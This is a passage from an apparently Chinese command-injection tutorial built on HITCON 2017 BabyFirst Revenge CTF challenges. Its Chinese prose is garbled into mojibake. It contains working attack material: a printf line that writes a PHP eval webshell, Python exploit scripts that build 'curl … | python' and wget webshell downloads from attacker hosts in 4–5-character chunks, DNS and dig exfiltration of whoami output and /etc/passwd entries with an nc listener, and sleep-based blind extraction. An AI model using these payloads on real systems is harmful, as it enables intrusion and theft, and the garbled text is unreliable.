   $ {printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
   ```

3. å•å¼•å·åŒå¼•å·

   ```bash
   $ c"a"t /f''l'a'g
   flag{xxx}
   ```

4. åæ–œçº¿

   ```bash
   $ c\a\t /f\l\ag
   flag{xxx}
   ```

5. åˆ©ç”¨å·²ç»å­˜åœ¨çš„èµ„æº

   ```bash
   $ echo $PATH
   /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   
   $ echo $PATH| cut -c 1
   /
   ```

6. åˆ©ç”¨ä¸€äº›å·²æœ‰å­—ç¬¦

   * ${PS2} å¯¹åº”å­—ç¬¦ `>`
   * ${PS4} å¯¹åº”å­—ç¬¦ `+`
   * ${IFS} å¯¹åº” å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦
   * ${9} å¯¹åº” ç©ºå­—ç¬¦ä¸²



###	ä¸¾ä¸ªğŸŒ° 

####	çŸ­å‘½ä»¤æ‰§è¡Œ

é¦–å…ˆæŒ‰ç…§å‰é¢çš„`>`çš„ç”¨æ³•ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æœ‰æ ‡å‡†è¾“å‡ºå¯ä»¥è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œæ‰€ä»¥

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fylohigzelj20di03udhe.jpg)

è¿™é‡Œæˆ‘ä»¬æœ‰ä¸¤ç§æ„é€ æ–¹å¼:

1. åªç”¨`\`åˆ†è¡Œè¾“å…¥ï¼Œè¿™ä¸ªä¼˜ç‚¹æ˜¯å¯ä»¥ä¸ç”¨è€ƒè™‘æ—¶é—´é¡ºåºï¼Œç›´æ¥ç”¨`ls>a`è¾“å‡ºåˆ°`a`æ–‡ä»¶ï¼Œè¿™é‡Œå¯èƒ½æœ‰ä¸€ç‚¹è¯¯è§£ï¼Œè¿™é‡Œæ˜¯è¾“å…¥

   ```bash
   $ >ec\
   ho\
   \ 1
   #è¿™ä¸ªæ–¹æ³•å‰é¢ä¸éœ€è¦åŠ >ï¼Œæœ€åç”¨\è½¬ä¹‰ç©ºæ ¼
   ```


![](https://ws1.sinaimg.cn/large/64ef14dcgy1fylpd2xpc2j20f609yafw.jpg)

2. ä½¿ç”¨`\\`ï¼Œè¿™ç§æ–¹æ³•æ˜¯åˆ©ç”¨`\`æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­å‰ä¸€ä¸ª`\`æ˜¯ç”¨æ¥è½¬ä¹‰åä¸€ä¸ª`\`çš„ã€‚è¿™é‡Œéœ€è¦è€ƒè™‘æ—¶é—´é¡ºåºï¼Œéœ€è¦é€†åºæ¥åˆ›å»ºæ–‡ä»¶ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fylp50us2bj20fq0bwdm1.jpg)

####	Example 1	ä¸ƒå­—ç»•è¿‡

è¿™é‡Œæ˜¯ä¸ªpç‰›å‡ºçš„é¢˜

```php
<?php
if(strlen($_GET[1])<8){
     echo shell_exec($_GET[1]);
}
?>
```

æˆ‘ä»¬å¯ä»¥åˆ†åˆ«é€šè¿‡å‘é€

```
?1=>hp
?1=>ell.p\\
?1=>\ sh\\
?1=>\ -O\\
?1=>com\\
?1=>x.\\
?1=>\ xx\\
?1=>wget\\
?1=ls -t>a
?1=sh a
```

ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šè¿°çš„ç¬¬äºŒä¸ªæ–¹æ³•å†™å…¥ä¸€ä¸ª`a`æ–‡ä»¶ï¼Œå…¶ä¸­`xxx.com`å¯ä»¥æ›¿æ¢ä¸ºè‡ªå·±çš„åŸŸåï¼Œä½†æ˜¯è¿™é‡Œè¦æ³¨æ„ï¼Œä¸èƒ½ä»¥`.`å¼€å¤´ï¼Œå› ä¸º`ls -t>a`æ— æ³•å°†éšè—æ–‡ä»¶åå†™å…¥`a`ã€‚

è´´ä¸€ä¸‹pç‰›çš„è„šæœ¬

```python
#!/usr/bin/python3
#-*- coding: utf-8 -*- 
 
import requests 
def GetShell():
    url = "http://192.168.56.129/shell.php?1="
    fileNames = ["1.php","-O\ \\","cn\ \\","\ a.\\","wget\\"] 
    # linuxåˆ›å»ºä¸­é—´æœ‰ç©ºæ ¼çš„æ–‡ä»¶åï¼Œéœ€è¦è½¬ä¹‰ï¼Œæ‰€ä»¥æœ‰è¯·æ±‚"cn\ \\"
    # å¯ä»¥ä¿®æ”¹hostsæ–‡ä»¶ï¼Œè®©a.cnæŒ‡å‘ä¸€ä¸ªè‡ªå·±çš„æœåŠ¡å™¨ã€‚
    # åœ¨a.cn çš„æ ¹ç›®å½•ä¸‹åˆ›å»ºindex.html ï¼Œå†…å®¹æ˜¯ä¸€ä¸ªphp shell 
 
    for fileName in fileNames:
        createFileUrl = url+">"+fileName
        print createFileUrl 
        requests.get(createFileUrl)
 
    getShUrl = url + "ls -t>1"
    print getShUrl
    requests.get(getShUrl)
    getShellUrl = url + "sh 1"
    print getShellUrl
    requests.get(getShellUrl)
 
    shellUrl = "http://192.168.56.129/1.php"
    response = requests.get(shellUrl)
    if response.status_code == 200:
        print "[*] Get shell !"
    else :
        print "[*] fail!"
 
if __name__ == "__main__":
    GetShell()
```



####	Example 2	äº”å­—ç»•è¿‡	[HITCON CTF 2017-BabyFirst Revenge]

æºç :

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

è¿™é‡Œéœ€è¦æˆ‘ä»¬æ³¨æ„çš„æ˜¯`cmd <= 5`ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸èƒ½åœ¨ä½¿ç”¨`ls -t>a`ã€‚

ä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡æ¯”è¾ƒå·§å¦™çš„æ„é€ æ¥å®ç°`ls -t>a`è¿™ä¹ˆä¸€ä¸ªæ“ä½œçš„ã€‚å¯ä»¥å…ˆé€šè¿‡æŠŠ`ls -t>a`è¿™æ ·æ‹†åˆ†æˆå‡ æ®µå†™å…¥åˆ°`_`æ–‡ä»¶å­˜æ”¾ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymd36mystj20ey0fcjz2.jpg)

ä»å›¾ä¸­æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°`_`é‡Œé¢çš„å†…å®¹ï¼Œç¬¬ä¸€è¡Œæ— æ•ˆå‘½ä»¤ï¼Œ2-5è¡Œå› ä¸ºæœ«å°¾æœ‰`\`è¿æ¥å­—ç¬¦çš„å­˜åœ¨æ‰€ä»¥å¯ä»¥è¿æ¥å­—ç¬¦ä¸²å½¢æˆ`ls -t>g`ï¼Œæœ€åä¸€è¡Œæ‰§è¡Œ`ls`ã€‚æ‰€ä»¥`sh _`æˆ‘ä»¬å¯ä»¥å¾—åˆ°å½“å‰ç›®å½•`ls -t>g`çš„æ•ˆæœã€‚è¾¾åˆ°ä¸`Example 1`ä¸€è‡´çš„æ•ˆæœï¼Œå…¶ä»–æ­¥éª¤ä¸`Example 1`ç±»ä¼¼ï¼Œå°±ä¸å†èµ˜è¿°äº†ã€‚ä¸‹é¢ç»™å‡º`Orange`çš„`exp`

```python
import requests
from time import sleep
from urllib import quote
payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 
    # generate `curl orange.tw.tw>python`
    # curl shell.0xb.pw|python
    '>on', 
    '>th\\', 
    '>py\\',
    '>\|\\', 
    '>pw\\', 
    '>x.\\',
    '>xx\\', 
    '>l.\\', 
    '>el\\', 
    '>sh\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 
    # exec
    'sh _', 
    'sh g', 
]
# r = requests.get('http://localhost/tmp/?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://localhost/tmp/?cmd=' + quote(i) )
    print i
    sleep(0.2)
```



ç›¸å…³Writeup:

- [HITCON CTF 2017-BabyFirst Revenge-writeup](https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/)
- [HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl)](http://www.jianshu.com/p/82788b6949c7)
- [HITCON 2017 CTF BabyFirst Revenge](https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/)
- [HITCON CTF 2017 - BabyFirst Revenge (172 pts.)](https://kimtruth.github.io/2017/11/06/HITCON-CTF-2017-BabyFirst-Revenge-172-pts/)
- [Hitcon CTF 2017 - Baby Revenge](https://theromanxpl0it.github.io/ctf_hitcon2017/babyrevenge/)
- [Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd)](https://losfuzzys.github.io/writeup/2017/11/06/hitconctf-babyfirstrevenge/)
- [HITCON CTF 2017 BabyFirst Revenge & v2 writeup](https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/)
- [BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter](https://github.com/n4p5ter/BabyFirst-Revenge-HITCOIN-2017-QUALS)



####	Example 3	å››å­—ç»•è¿‡	[HITCON 2017 BabyFirst Revenge v2]

æºç ï¼š

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
?>
```

è¿™é¢˜ç›¸æ¯”ä¹‹å‰åˆéš¾äº†ä¸€ç‚¹ï¼Œè¿™æ¬¡æ˜¯`cmd <= 4`ï¼Œä½†æ˜¯åŸç†è¿˜æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬è¦å¤„ç†çš„é—®é¢˜è¿˜æ˜¯`ls -t>g`è¿™ä¹ˆä¸€ä¸ªé—®é¢˜ã€‚ç„¶åå› ä¸ºé•¿åº¦é™åˆ¶ï¼Œå¦‚æœæˆ‘ä»¬è¿˜ç”¨`\\`ä½œä¸ºå­—ç¬¦ä¸²è¿æ¥çš„è¯ï¼Œåªå‰©ä¸‹ä¸¤ä¸ªå­—ç¬¦ï¼ŒåŠ ä¸Šæœ€å¼€å§‹å¿…é¡»è¦ç”¨`>`åˆ›å»ºæ–‡ä»¶ï¼Œæ‰€ä»¥åªå‰©ä¸‹ä¸€ä¸ªå¯æ§å­—ç¬¦ã€‚æ‰€ä»¥ç¢°åˆ°éœ€è¦è½¬ä¹‰ç©ºæ ¼è¿™ç§åœ°æ–¹ä¾‹å¦‚`Exmaple 2`ä¸­çš„`>\ \\`è¿™é‡Œå°±ä¸èƒ½å†ä½¿ç”¨äº†ã€‚ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œå†æä¸€ä¸ª`trick`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymhdhrmuuj20rk0jy1eq.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymhg7vu7pj20rm0hkngg.jpg)

`*` ç›¸å½“äº`$(dir *)`,æ‰€ä»¥è¯´å¦‚æœæ–‡ä»¶åå¦‚æœæ˜¯å‘½ä»¤çš„è¯å°±ä¼šè¿”å›æ‰§è¡Œçš„ç»“æœ,ä¹‹åçš„ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚ä¾‹å¦‚ï¼š

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymhz9q2loj21320h0qtd.jpg)

æ‰€ä»¥å›åˆ°é¢˜ç›®ï¼Œå¦‚æœæŒ‰ç…§é¡ºåºå»åˆ›å»ºæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°å¦‚æœç›´æ¥ç”¨`*`å»æ‰§è¡Œçš„è¯ï¼Œå‘ç°å¹¶ä¸å¯ä»¥ï¼Œå› ä¸ºæŒ‰ç…§`dir`çš„æ–‡ä»¶æ’åºï¼Œ`-t`ä¹Ÿæ˜¯æ’åœ¨æœ€å‰é¢ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymi5dskw0j20j209ujzs.jpg)

æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å‚è€ƒä¸€ä¸‹`alphabetical`æ¥æ’åºï¼Œè¿™é‡Œå°±ä¸è¦ç”¨`Docker`æ¥åšäº†ï¼Œå› ä¸º`busybox`é‡Œé¢ä¸€äº›ä¸œè¥¿è¿˜æ˜¯è·ŸçœŸå®ç¯å¢ƒä¼˜ç‚¹åŒºåˆ«çš„ã€‚![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymmfc648jj218e0cswgu.jpg)

æ‰€ä»¥å¦‚æœæˆ‘ä»¬éœ€è¦è¿ç”¨`-`å­—ç¬¦çš„è¯ï¼Œä»–ä¼šæ’åœ¨æœ€å‰é¢ï¼Œè¿™é‡Œå°±æ¯”è¾ƒå‘äº†ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³ä¸ªåŠæ³•æŠŠ`-t`ç½®äºåé¢ã€‚

è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`t-`è¿™ç§é€†åºçš„æ¨¡å¼æŠŠ`t`æ”¾åˆ°å‰é¢æ¥ï¼Œå°±å¯ä»¥æ¯”è¾ƒæ­£å¸¸çš„æ’åºäº†ã€‚

é€†åºçš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥ç”¨`rev`æ¥å®ç°ï¼Œå¦å¤–æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå­—æ¯æ¯”è¾ƒé å‰çš„å‘½ä»¤æ¥å±•ç¤ºå½“å‰ç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨`dir`æ¥å±•ç¤ºå½“å‰ç›®å½•ï¼ŒåŒæ—¶`d`å­—æ¯ä¹Ÿæ¯”è¾ƒé å‰ï¼Œä¸è¦åƒ`ls`ç‰¹åˆ«è€ƒè™‘æ’åºçš„é—®é¢˜ã€‚æ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥é€šè¿‡è¿™ä¹ˆä¸€ä¸ªå½¢å¼å»æ„é€ `ls -t>g`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymxkbytn4j20pg0h41cd.jpg)

è¿™é‡Œå¯èƒ½æœ‰å‡ ä¸ªè®©å¤§å®¶æ¯”è¾ƒç–‘æƒ‘çš„åœ°æ–¹ï¼Œæ¯”å¦‚ä¸ºä»€ä¹ˆæ˜¯`>ht-`ï¼Œä¸ªäººç†è§£æ˜¯å› ä¸º`ls`é€†åºæ˜¯`sl`ï¼Œ`s`æ˜¯æ’åœ¨`t`å‰çš„ï¼Œå¦‚æœä¸åŠ `h`ï¼Œ`t-`ä¼šåœ¨`sl`ä¹‹åï¼Œè€Œä¸”`ls -th`ä¸`ls -t`æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œç„¶åæˆ‘ä»¬å†æ‰¾ä¸€ä¸ª`h`ä¹‹å‰çš„å­—æ¯åšè¾“å‡ºæ–‡ä»¶å°±å¯ä»¥äº†ã€‚è¿˜æœ‰ä¸€ä¸ªåœ°æ–¹å°±æ˜¯`*v>x`ï¼Œä¹‹å‰æˆ‘ä»¬è®²è¿‡äº†é€šé…ç¬¦ä»¥åŠ`*`çš„ä½œç”¨ï¼Œè¿™é‡Œ`*v`å°±ç›¸å½“äº`$(dir *v)>x`ï¼Œ`dir *v`è¿”å›çš„å°±æ˜¯ç»“å°¾ä¸º`v`çš„æ–‡ä»¶ï¼Œè¿™é‡Œå°±æ˜¯`rev`ä¸`v`ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¦‚æœåªæœ‰ç›¸å½“äºå…ˆæŠŠ`v`æ–‡ä»¶å†…å®¹è¿›è¡Œé€†åºï¼Œè€Œåå†è¾“å…¥åˆ°`x`æ–‡ä»¶ï¼Œè¿™æ ·æ•´ä¸ª`ls -t>g`çš„å‘½ä»¤æ‹¼å‡‘å°±å®Œæˆäº†ï¼Œæ¥ç€æ–¹æ³•å°±æœ‰å¾ˆå¤šç§äº†ï¼Œæ¯”è¾ƒç®€å•çš„å°±æ˜¯ç›´æ¥`wget`æˆ–è€…`curl`ä¸€ä¸ª`webshell`åˆ°æœåŠ¡å™¨ä¸Šå°±å¥½äº†ï¼Œå°±ä¸å†èµ˜è¿°äº†ã€‚

å†ç»™ä¸€ä¸ª`Orange`çš„`exp`

```python
import requests
from time import sleep
from urllib import quote

payload = [
    # generate "g> ht- sl" to file "v"
    '>dir', 
    '>sl', 
    '>g\>',
    '>ht-',
    '*>v',

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',

    # generate "curl orange.tw|python;"
    '>\;\\', 
    '>on\\', 
    '>th\\', 
    '>py\\', 
    '>\|\\', 
    '>tw\\',
    '>e.\\', 
    '>ng\\', 
    '>ra\\', 
    '>o\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 

    # got shell
    'sh x', 
    'sh g', 
]


r = requests.get('http://52.197.41.31/?reset=1')
for i in payload:
    assert len(i) <= 4
    r = requests.get('http://52.197.41.31/?cmd=' + quote(i) )
    print i
    sleep(0.1)
```



ç›¸å…³Writeup:

- [Baby First Revenge v2 (Via vim) by @bennofs](https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md)
- [[python\] baby-exp.py](https://codegists.com/snippet/python/baby-exppy_beched_python)
- [How to solve a CTF challenge for $20 - HITCON 2017 BabyFirst Revenge v2](https://www.eugenekolo.com/blog/hitcon-babyfirst-revenge-v2/)
- [HITCON CTF 2017 BabyFirst Revenge & v2 writeup](https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/)



###	æ— å›æ˜¾çš„å‘½ä»¤æ³¨å…¥

æˆ‘ä»¬ä¹‹å‰æåˆ°çš„å¤§éƒ¨åˆ†éƒ½æ˜¯æœ‰å›æ˜¾æˆ–è€…ä¸€éƒ¨åˆ†æç¤ºçš„å‘½ä»¤æ³¨å…¥ï¼Œå½“æˆ‘ä»¬é‡åˆ°æ— å›æ˜¾çš„å‘½ä»¤æ³¨å…¥çš„æ—¶å€™æˆ‘ä»¬åˆè¦æ€ä¹ˆåŠå‘¢ï¼Ÿ

####	DNS Log

é¡¹ç›®åœ°å€ï¼š[BugScanTeam/DNSLog](https://github.com/BugScanTeam)

å¯¹äºä¸€äº›å‘½ä»¤ç›²æ³¨ç±»çš„æ¼æ´ï¼Œè¿™é€šå¸¸æ˜¯æ¯”è¾ƒæœ‰æ•ˆçš„æ–¹æ³•ï¼Œå› ä¸ºé€šå¸¸å‡ºç«™DNSæµé‡ä¸ä¼šè¢«é˜»æ­¢å¯ä»¥é€šè¿‡ï¼ŒDNSLog ä¸­çš„ WebLog éƒ¨åˆ†å°†å…¶è½¬åŒ–ä¸ºæœ‰å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œï¼š

```
curl "http://testhash.test.dnslog.link/?`whoami`"
```

è¿™ä¸ªç”¨èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œç›´æ¥å»æŸ¥çœ‹å¯¹åº”çš„è®°å½•å°±å¥½äº†ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymyefg60qj217e03qqcv.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymyeptgv0j21ro076ab3.jpg)

æœ‰æ—¶å€™ä½ éœ€è¦ç¼–ç æƒ³è¦è¯»å‡ºæ¥çš„å†…å®¹ï¼Œè¿™æ ·æ‰ä¸ä¼šç”±äºä¸€äº›ç©ºæ ¼æˆ–è€…ä»€ä¹ˆå…¶ä»–å­—ç¬¦å¯¼è‡´è¯»ä¸å®Œæ•´æ•°æ®ã€‚

è¿™é‡Œä¸ä»…å¯ä»¥ç”¨äºå‘½ä»¤æ³¨å…¥ï¼Œè¿˜å¯ä»¥ç”¨äº`xss`ç­‰å…¶ä»–ä¸€äº›æ— å›æ˜¾çš„æ”»å‡»ã€‚

è¿™é‡Œå†ç»™ä¸ªèµ°`udp`æµé‡çš„ç¤ºä¾‹

```bash
Only OB DNS traffic (UDP/53) allowed and can exec commands? Use 
dig `cut -d: -s -f1 /etc/passwd | sed 10\!d` @ip
to offload file contents.
```

æœåŠ¡ç«¯ï¼š

```bash
nc -l -n -vv -p 53 -u -k(å¦‚æœä¸æ”¯æŒ-kä¹Ÿå¯ä»¥ä¸ç”¨-k)
```

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fynlyqbpj2j20ti048ahj.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fynlyxejhmj20le0esh2i.jpg)

Same:

```bash
{dig,`{cut,-d:,-s,-f1,/etc/passwd}|{sed,2\!d}`,@ip}
```



####	sleep

æ£€æµ‹æ˜¯å¦æœ‰å‘½ä»¤æ³¨å…¥æ¯”è¾ƒå¥½çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨`sleep`ï¼Œå¹¶è§‚å¯Ÿå…¶æ‰§è¡Œæ—¶é—´æ˜¯å¦å¢åŠ ã€‚

```bash
$ time ruby ping.rb '8.8.8.8'
PING 8.8.8.8 (8.8.8.8): 56 data bytes
...
0.09s user 0.04s system 4% cpu 3.176 total

$ time ruby ping.rb '8.8.8.8 && sleep 5'
PING 8.8.8.8 (8.8.8.8): 56 data bytes
...
0.10s user 0.04s system 1% cpu 8.182 total
```

å¯ä»¥çœ‹å‡ºå¦‚æœå­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œæ‰§è¡Œæ—¶é—´ä¼šæŒ‰ç…§æˆ‘ä»¬`sleep`çš„å‚æ•°å¢åŠ ï¼Œæˆ‘ä»¬è¿™é‡Œå†ç®€å•æ€»ç»“ä¸€ä¸‹å‰é¢å•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«

| å‘½ä»¤                                 | ç»“æœ                                                         |
| ------------------------------------ | ------------------------------------------------------------ |
| ping -c 4 8.8.8.8\`sleep 5\`         | sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œå‘½ä»¤æ›¿æ¢åœ¨å‘½ä»¤è¡Œä¸­ã€‚                        |
| ping -c 4 "8.8.8.8\`sleep 5\`"       | sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œå‘½ä»¤æ›¿æ¢åœ¨å¤æ‚çš„å­—ç¬¦ä¸²åŒå¼•å·ä¹‹é—´ã€‚          |
| ping -c 4 $(echo 8.8.8.8\`sleep 5\`) | sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œå‘½ä»¤æ›¿æ¢åœ¨ä½¿ç”¨ä¸åŒç¬¦å·æ—¶ã€‚                  |
| ping -c 4 '8.8.8.8\`sleep 5\`'       | sleepå‘½ä»¤ä¸æ‰§è¡Œï¼Œå‘½ä»¤æ›¿æ¢åœ¨ç®€å•å­—ç¬¦ä¸²ä¸­ä¸èµ·ä½œç”¨ï¼ˆå•å¼•å·ä¹‹é—´ï¼‰ã€‚ |
| ping -c 4 \`echo 8.8.8.8\`sleep 5``  | sleepå‘½ä»¤ä¸æ‰§è¡Œï¼Œä½¿ç”¨ç›¸åŒç¬¦å·æ—¶å‘½ä»¤æ›¿æ¢ä¸èµ·ä½œç”¨ã€‚            |
| ping -c 4 8.8.8.8;sleep 5            | sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œå‘½ä»¤åœ¨å‘½ä»¤è¡Œä¸­é¡ºåºæ‰§è¡Œã€‚                    |
| ping -c 4 "8.8.8.8;sleep 5"          | sleepå‘½ä»¤æœªè¢«æ‰§è¡Œï¼Œé™„åŠ å‘½ä»¤è¢«æ³¨å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œè¯¥å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™pingå‘½ä»¤ã€‚ |
| ping -c 4 $(echo 8.8.8.8;sleep 5)    | sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œæ’åºå‘½ä»¤åœ¨å‘½ä»¤æ›¿æ¢ä¸­èµ·ä½œç”¨ã€‚                |
| ping -c 4 '8.8.8.8;sleep 5'          | sleepå‘½ä»¤æœªè¢«æ‰§è¡Œï¼Œ é™„åŠ å‘½ä»¤è¢«æ³¨å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œè¯¥å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™pingå‘½ä»¤ã€‚ |
| ping -c 4 \`echo 8.8.8.8;sleep 5`    | sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œæ’åºå‘½ä»¤åœ¨å‘½ä»¤æ›¿æ¢ä¸­èµ·ä½œç”¨ã€‚                |
| ping -c 4 8.8.8.8 \| sleep 5         | sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œç®¡é“è¾“å‡ºåœ¨å‘½ä»¤è¡Œæ­£å¸¸æ‰§è¡Œã€‚                  |
| ping -c 4 "8.8.8.8 \| sleep 5"       | sleepå‘½ä»¤æœªè¢«æ‰§è¡Œï¼Œé™„åŠ å‘½ä»¤è¢«æ³¨å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œè¯¥å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™pingå‘½ä»¤ã€‚ |
| ping -c 4 $(echo 8.8.8.8 \| sleep 5) | sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œç®¡é“è¾“å‡ºåœ¨å‘½ä»¤æ›¿æ¢ä¸­èµ·ä½œç”¨ã€‚                |
| ping -c 4 '8.8.8.8 \| sleep 5'       | sleepå‘½ä»¤æœªè¢«æ‰§è¡Œï¼Œé™„åŠ å‘½ä»¤è¢«æ³¨å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œè¯¥å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™pingå‘½ä»¤ã€‚ |
| ping -c 4 \`echo 8.8.8.8 \| sleep 5` | sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œç®¡é“è¾“å‡ºåœ¨å‘½ä»¤æ›¿æ¢ä¸­èµ·ä½œç”¨ã€‚                |



é™¤äº†æ¢æµ‹æ˜¯å¦æœ‰å‘½ä»¤æ³¨å…¥ä¹‹å¤–ï¼Œ`sleep`è¿˜æœ‰ä¸€ä¸ªå¯ä»¥ç”¨äºå‘½ä»¤ç›²æ³¨çš„æ–¹æ³•ã€‚

```bash
sleep $(hostname | cut -c 1 | tr a 5)
```

1. æˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤ä¸º`hostname`ã€‚æˆ‘ä»¬å‡è®¾å®ƒè¿”å›`hacker.local`ã€‚
2. å®ƒéœ€è¦è¾“å‡ºå¹¶å°†å…¶ä¼ é€’ç»™`cut -c 1`ã€‚è¿™å°†é€‰å–`hacker.local`çš„ç¬¬ä¸€ä¸ªå­—ç¬¦hã€‚
3. æ¥ç€é€šè¿‡trå‘½ä»¤å°†å­—ç¬¦`a`æ›¿æ¢ä¸º5ã€‚
4. ç„¶åå°†trå‘½ä»¤çš„è¾“å‡ºä¼ é€’ç»™`sleep`å‘½ä»¤ï¼Œ`sleep h`è¢«æ‰§è¡Œå°†ä¼šç«‹å³å‡ºç°æŠ¥é”™ï¼Œè¿™æ˜¯å› ä¸º`sleep`åè·Ÿçš„å‚æ•°æ™ºèƒ½ä¸ºä¸€ä¸ªæ•°å­—ã€‚ç„¶åï¼Œç›®æ ‡ä½¿ç”¨trå‘½ä»¤è¿­ä»£å­—ç¬¦ã€‚æ‰§è¡Œ`sleep $(hostname | cut -c 1 | tr h 5)`å‘½ä»¤ï¼Œå°†éœ€è¦5ç§’é’Ÿçš„æ—¶é—´ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç¡®å®šç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªhã€‚ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬å°±èƒ½å°†å®Œæ•´çš„ä¸»æœºåçŒœè§£å‡ºæ¥ã€‚

å½“ç„¶ï¼Œè¿™ä¸ªåˆ©ç”¨æ¡ä»¶å¯èƒ½å¯¹ç½‘ç»œç¯å¢ƒè¦æ±‚æ¯”è¾ƒé«˜ï¼Œä½†æ˜¯ä¾é å“åº”æ—¶é—´çš„ç›¸å¯¹æ—¶é—´æ¥åˆ¤æ–­ï¼Œä¹Ÿè¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“åˆ¤æ–­çš„ï¼Œæµ‹è¯•ç¤ºä¾‹ï¼š

| å‘½ä»¤                                                         | æ—¶é—´ | ç»“æœ |
| ------------------------------------------------------------ | ---- | ---- |
| ruby server-online.rb '8.8.8.8;sleep $(hostname \| cut -c 1 \| tr a 5)' | 3s   | â€“    |
| ruby server-online.rb '8.8.8.8;sleep $(hostname \| cut -c 1 \| tr h 5)' | 8s   | h    |
| ruby server-online.rb '8.8.8.8;sleep $(hostname \| cut -c 2 \| tr a 5)' | 8s   | a    |
| ruby server-online.rb '8.8.8.8;sleep $(hostname \| cut -c 3 \| tr a 5)' | 3s   | â€“    |
| ruby server-online.rb '8.8.8.8;sleep $(hostname \| cut -c 3 \| tr c 5)' | 8s   | c    |

